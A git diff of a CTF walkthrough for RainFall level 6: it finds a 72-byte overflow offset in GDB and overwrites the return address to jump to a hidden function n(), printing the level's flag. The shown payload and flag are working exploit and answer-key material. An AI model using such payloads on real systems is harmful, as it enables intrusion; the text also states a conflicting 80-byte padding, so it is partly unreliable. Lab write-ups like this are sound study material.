@@ -30,23 +30,18 @@ Disassembling functions:
 There's a function called `n()` which calls a syscall.
 The main uses 2 mallocs and a strcpy. If there's a strcpy there's a way to leak.
 
-> Observations:
->
-> * The program segfaults when there's no arg.
-> * And when there's an arg it says "nope".
-
 ---
 
 ## Step 2: Find the Offset with GDB
 
-We use the cyclic string to identify the overwrite point:
+We use a specific string to identify the overwrite point:
 
 ```bash
 (gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9...
 Program received signal SIGSEGV
 0x41346341 in ?? ()
 ```
-By calculating the position of `0x41346341` in the cyclic string, we determine the **offset** is 72 bytes.
+By calculating the position of `0x41346341` in the string, we determine the **offset** is 72 bytes.
 
 ---
 
@@ -58,10 +53,15 @@ To exploit the program:
 * We need: `padding (80 bytes) + address of n()`
 
 ```bash
-./level6 $(python -c 'print "A" * 72 + "add de n")
+python -c 'print "A" * 72 + "add de n"
 ```
 
-This overwrites the return address with the address of `n()` (0x08048444).
+This overwrites the return address with the address of `n()`.
+
+```bash
+(gdb) info functions
+    0x08048454  n
+```
 
 ---
 
@@ -70,8 +70,8 @@ This overwrites the return address with the address of `n()` (0x08048444).
 Running the exploit:
 
 ```bash
-level6@RainFall:~$ ./level6 $(cat /tmp/exploit)
-123456789abcdef...
+level6@RainFall:~$ ./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08")
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 ```
 
 Now we can read:
@@ -84,14 +84,6 @@ level6@RainFall:~$
 
 ---
 
-## Step 6: Summary
-
-* **Vulnerability:** Buffer overflow via unchecked input.
-* **Offset:** 80 bytes to reach EIP.
-* **Target:** Hidden function `n()` at `0x08048444`.
-* **Outcome:** Successfully redirected execution to `n()`, retrieved the `level6` password.
-
----
-
 **End of Level 6 Walkthrough**
+
 
